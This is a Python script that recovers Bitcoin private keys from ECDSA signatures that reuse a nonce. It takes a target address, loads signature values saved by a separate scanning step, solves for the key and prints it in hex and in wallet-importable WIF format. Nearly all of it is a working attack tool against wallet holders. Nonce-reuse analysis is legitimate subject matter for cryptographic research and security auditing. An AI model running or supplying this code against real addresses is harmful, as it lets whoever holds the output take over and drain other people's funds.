import json
import secp256k1 as ice
import hashlib
import base58

N = ice.N

def inv(a):
    return pow(a, N - 2, N)

def getpvk(r1, s1, z1, r2, s2, z2):
    # Recover the private key using two ECDSA signatures with the same nonce.
    print(f"Attempting private key recovery with values:\n  r1: {r1}\n  s1: {s1}\n  z1: {z1}\n  r2: {r2}\n  s2: {s2}\n  z2: {z2}")
    x1 = (s2 * z1 - s1 * z2) % N
    dr = (s1 * r2 - s2 * r1) % N
    print(f"Intermediate x1: {x1}")
    print(f"Intermediate dr (denominator): {dr}")

    if dr == 0:
        print("[ERROR] Denominator is zero; cannot compute private key.")
        return 0  # Indicate an error

    xi = inv(dr)
    private_key_value = (x1 * xi) % N
    print(f"Calculated private key: {private_key_value}")
    return private_key_value

def private_key_to_wif(private_key, compressed=True):
    # Converts a private key to WIF format.
    priv_key_hex = hex(private_key)[2:].zfill(64)
    if compressed:
        extended_key_hex = '80' + priv_key_hex + '01'
    else:
        extended_key_hex = '80' + priv_key_hex

    extended_key_bytes = bytes.fromhex(extended_key_hex)
    checksum = hashlib.sha256(hashlib.sha256(extended_key_bytes).digest()).digest()[:4]
    final_key_bytes = extended_key_bytes + checksum
    return base58.b58encode(final_key_bytes).decode()

# Load data from JSON file
address = input("Enter the Bitcoin address to load data for: ")
input_file = f"{address}_rsz_data.json"

try:
    with open(input_file, "r") as f:
        data = json.load(f)
    
    print("Loaded data:", data)

    # Iterate through each entry in the list to retrieve `r`, `s1`, `s2`, `z1`, `z2`, and `pub_key`
    for entry in data:
        pub_key_hex = entry["pub_key"]
        r1 = int(entry["r"], 16)
        s1 = int(entry["s1"], 16)
        z1 = int(entry["z1"], 16)

        r2 = int(entry["r"], 16)  # r should be the same for both entries due to reuse
        s2 = int(entry["s2"], 16)
        z2 = int(entry["z2"], 16)

        # Attempt private key recovery
        private_key = getpvk(r1, s1, z1, r2, s2, z2)
        print(f"Recovered Private Key (hex): {hex(private_key)}")

        # Convert the recovered private key to WIF format if it’s valid
        if private_key != 0:
            wif_key = private_key_to_wif(private_key)
            print(f"Private Key in WIF format: {wif_key}")
        else:
            print("Failed to recover private key.")

except FileNotFoundError:
    print(f"Error: Data file {input_file} not found. Please run the scan script first to generate it.")
except KeyError:
    print("Error: Data structure in JSON file is missing expected fields.")
except TypeError as e:
    print("Error processing data:", e)
